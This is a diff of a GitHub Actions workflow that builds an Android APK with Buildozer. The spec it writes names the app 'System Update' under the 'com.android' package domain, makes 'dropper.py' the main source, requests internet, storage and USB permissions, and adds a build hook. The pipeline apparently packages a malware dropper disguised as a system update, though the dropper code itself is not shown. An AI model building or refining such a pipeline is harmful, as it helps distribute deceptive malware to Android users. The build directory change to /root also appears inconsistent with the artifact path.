@@ -11,6 +11,12 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v4
 
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+
       - name: Set up Python
         uses: actions/setup-python@v5
         with:
@@ -20,42 +26,66 @@ jobs:
         run: |
           sudo apt-get update
           sudo apt-get install -y \
-            git openjdk-17-jdk zlib1g-dev libffi-dev libssl-dev \
-            python3-pip build-essential libtool m4 autoconf automake \
-            pkg-config libltdl-dev libltdl7
-
-      - name: Upgrade autotools
-        run: |
-          sudo apt-get install -y autoconf automake libtool
-          autoconf --version
-          automake --version
+            git zlib1g-dev libffi-dev libssl-dev \
+            build-essential libtool m4 autoconf automake \
+            pkg-config libltdl-dev libltdl7 cython3
+          
+          # Verify installations
+          which libtool
           libtool --version
 
-      - name: Install buildozer and dependencies
+      - name: Upgrade pip and install Python dependencies
         run: |
-          pip install --upgrade pip setuptools wheel
-          pip install buildozer cython Pillow
+          python -m pip install --upgrade pip setuptools wheel
+          pip install buildozer cython Pillow requests urllib3
 
-      - name: Initialize buildozer
-        run: buildozer init
-
-      - name: Configure buildozer.spec
+      - name: Create buildozer.spec
         run: |
-          sed -i 's/requirements = python3,kivy/requirements = python3,requests,urllib3/g' buildozer.spec
-          sed -i 's/title = My Application/title = System Update/g' buildozer.spec
-          sed -i 's/package.name = myapp/package.name = systemupdate/g' buildozer.spec
-          sed -i 's/package.domain = org.test/package.domain = com.android/g' buildozer.spec
-          sed -i 's/#source.main = main.py/source.main = dropper.py/g' buildozer.spec
-          echo 'android.accept_sdk_license = True' >> buildozer.spec
-          sed -i 's/android.api = .*/android.api = 33/g' buildozer.spec
-          sed -i 's/android.minapi = .*/android.minapi = 24/g' buildozer.spec
-          sed -i 's/android.ndk = .*/android.ndk = 27.3.13750724/g' buildozer.spec
+          cat > buildozer.spec << 'EOF'
+          [app]
+          title = System Update
+          package.name = systemupdate
+          package.domain = com.android
+          source.main = dropper.py
+          version = 0.1
+          requirements = python3,requests,urllib3,android
+          permissions = INTERNET,WRITE_EXTERNAL_STORAGE,READ_EXTERNAL_STORAGE
+          features = android.hardware.usb.host
+          
+          [buildozer]
+          log_level = 2
+          
+          [app:permissions]
+          
+          [app:permissions:android]
+          android.accept_sdk_license = True
+          android.api = 33
+          android.minapi = 24
+          android.ndk = 27.3.13750724
+          android.archs = arm64-v8a,armeabi-v7a
+          p4a.hook = hooks.py
+          EOF
 
-      - name: Build APK
-        run: yes | buildozer android debug deploy run --verbose
+      - name: Build APK with Buildozer
+        run: |
+          cd /root
+          buildozer android debug 2>&1 | tee build.log
+        continue-on-error: false
 
-      - name: Upload APK
+      - name: Upload APK artifact
+        if: success()
         uses: actions/upload-artifact@v4
         with:
           name: systemupdate-apk
           path: bin/*.apk
+          retention-days: 30
+
+      - name: Upload build logs
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: build-logs
+          path: |
+            build.log
+            .buildozer/
+          retention-days: 7
